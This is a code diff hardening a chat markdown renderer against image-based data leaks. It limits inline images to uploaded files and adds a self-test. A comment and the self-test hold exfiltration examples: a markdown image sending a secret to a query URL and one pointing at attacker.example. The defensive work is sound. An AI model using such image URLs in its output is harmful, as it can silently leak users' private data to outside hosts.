@@ -3,8 +3,9 @@ import { markedHighlight } from 'marked-highlight'
 import {
 	allowedInlineTag,
 	escapeHtml,
+	escapeText,
+	inlineImageSrc,
 	safeUrl,
-	sameOriginImageSrc,
 	sanitizedText,
 	sanitizerHolds,
 } from '$lib/util/safe-markdown'
@@ -99,24 +100,25 @@ marked.use({
 			const inner = this.parser.parseInline(tokens)
 			const url = safeUrl(href)
 			if (!url) return inner
-			const titleAttr = title ? ` title="${escapeHtml(title)}"` : ''
+			const titleAttr = title ? ` title="${escapeText(title)}"` : ''
 			const external = url.external ? ' target="_blank" rel="noopener noreferrer nofollow"' : ''
 			return `<a href="${escapeHtml(url.href)}"${external}${titleAttr}>${inner}</a>`
 		},
 
 		/**
-		 * Only our own origin loads inline. A remote image would be fetched the moment the
-		 * message renders, with whatever the URL carries — `![](https://x/?d=<secret>)` is
-		 * a zero-click leak — so it becomes a link the user can choose to open.
+		 * Only an uploaded file loads inline (see `inlineImageSrc`). Any other image would
+		 * be fetched the moment the message renders, with whatever the URL carries:
+		 * `![](https://x/?d=<secret>)` is a zero-click leak, and so is a path on our own
+		 * origin that redirects. It becomes a link the reader can choose to open.
 		 */
 		image({ href, title, text }: Tokens.Image): string {
 			const alt = text ?? ''
-			const titleAttr = title ? ` title="${escapeHtml(title)}"` : ''
-			const local = sameOriginImageSrc(href)
-			if (local) return `<img src="${escapeHtml(local)}" alt="${escapeHtml(alt)}"${titleAttr} loading="lazy">`
+			const titleAttr = title ? ` title="${escapeText(title)}"` : ''
+			const inline = inlineImageSrc(href)
+			if (inline) return `<img src="${escapeHtml(inline)}" alt="${escapeText(alt)}"${titleAttr} loading="lazy">`
 			const url = safeUrl(href)
-			if (!url) return escapeHtml(alt)
-			return `<a href="${escapeHtml(url.href)}" target="_blank" rel="noopener noreferrer nofollow" class="md-remote-image" title="Remote image, not loaded automatically">Image: ${escapeHtml(alt || url.href)}</a>`
+			if (!url) return escapeText(alt)
+			return `<a href="${escapeHtml(url.href)}" target="_blank" rel="noopener noreferrer nofollow" class="md-remote-image" title="Image not loaded automatically">Image: ${alt ? escapeText(alt) : escapeHtml(url.href)}</a>`
 		},
 	},
 })
@@ -128,7 +130,8 @@ marked.use({
  */
 const CHAT_SANITIZER_INTACT =
 	sanitizerHolds((source) => marked.parse(source) as string) &&
-	!/<img/i.test(marked.parse('![x](https://attacker.example/leak)') as string)
+	!/<img/i.test(marked.parse('![x](https://attacker.example/leak)') as string) &&
+	!/<img/i.test(marked.parse('![x](/source-control/github/connect?return=/x)') as string)
 
 export function renderMarkdown(content: string) {
 	if (!CHAT_SANITIZER_INTACT) {
